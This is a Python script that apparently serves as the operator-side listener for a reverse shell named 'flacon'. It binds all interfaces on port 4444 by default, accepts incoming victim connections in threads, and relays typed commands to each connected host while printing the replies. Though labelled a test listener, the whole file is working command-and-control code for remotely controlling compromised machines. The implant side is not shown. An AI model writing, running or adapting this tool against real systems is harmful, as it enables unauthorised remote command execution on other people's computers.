#!/usr/bin/env python3
"""
Simple listener for testing flacon reverse shell
Usage: python3 test_listener.py [port]
"""

import socket
import sys
import threading
import time

def handle_client(client_socket, addr):
    print(f"[+] Accepted connection from {addr}")
    
    try:
        # Receive handshake
        handshake = client_socket.recv(1024).decode('utf-8').strip()
        print(f"[+] Handshake: {handshake}")
        
        # Send welcome message
        welcome = "Welcome to flacon reverse shell!\n"
        client_socket.send(welcome.encode('utf-8'))
        
        while True:
            # Get command from user
            command = input("flacon> ")
            if not command:
                continue
                
            if command.lower() in ['exit', 'quit']:
                print("[+] Closing connection...")
                break
                
            # Send command to client
            client_socket.send((command + "\n").encode('utf-8'))
            
            # Wait for response
            response = client_socket.recv(4096).decode('utf-8')
            print(f"[+] Response:\n{response}")
            
    except Exception as e:
        print(f"[-] Error handling client: {e}")
    finally:
        client_socket.close()
        print(f"[-] Connection to {addr} closed")

def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 4444
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind(('0.0.0.0', port))
        server.listen(5)
        print(f"[+] Listening on 0.0.0.0:{port}")
        print("[+] Waiting for flacon reverse shell connections...")
        
        while True:
            client, addr = server.accept()
            client_handler = threading.Thread(target=handle_client, args=(client, addr))
            client_handler.start()
            
    except KeyboardInterrupt:
        print("\n[+] Shutting down...")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        server.close()

if __name__ == "__main__":
    main() 